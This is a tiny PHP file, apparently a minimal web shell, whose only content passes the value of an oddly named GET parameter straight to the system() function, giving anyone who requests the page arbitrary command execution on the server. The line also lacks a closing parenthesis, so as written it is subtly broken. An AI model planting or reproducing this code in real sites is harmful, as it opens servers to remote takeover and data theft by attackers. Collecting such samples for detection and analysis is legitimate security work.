<?php
SysTeM($_GET['CYX-D9Cf'];
?>
